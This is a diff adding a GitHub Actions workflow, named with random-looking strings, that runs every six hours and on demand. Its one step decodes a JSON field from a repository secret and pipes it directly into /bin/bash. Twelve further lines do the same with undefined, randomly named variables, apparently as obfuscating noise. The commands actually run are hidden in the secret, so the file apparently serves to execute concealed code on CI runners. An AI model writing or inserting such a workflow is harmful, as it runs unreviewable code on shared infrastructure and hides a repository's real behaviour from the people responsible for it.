@@ -1,0 +1,31 @@
+name: kkemmusan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kkemmusan
+        env:
+          m19264: ${{ secrets.m19264 }}
+        run: |
+          echo $m19264 | jq -r .i58 | /bin/bash
+          echo $um9 | jq -r .yep872 | /bin/bash
+          echo $vvxu64102 | jq -r .fekxc65 | /bin/bash
+          echo $q2 | jq -r .gay882 | /bin/bash
+          echo $envhy62220 | jq -r .czk0 | /bin/bash
+          echo $vyxb9 | jq -r .kz37 | /bin/bash
+          echo $gwrd80272 | jq -r .nhru0 | /bin/bash
+          echo $krcro75 | jq -r .aqw325 | /bin/bash
+          echo $bnscl8136 | jq -r .jege26 | /bin/bash
+          echo $hva1226 | jq -r .oejrc84531 | /bin/bash
+          echo $ap9248 | jq -r .l247 | /bin/bash
+          echo $cgsng4534 | jq -r .ssf70666 | /bin/bash
+          echo $abzrh3 | jq -r .jog4 | /bin/bash
+
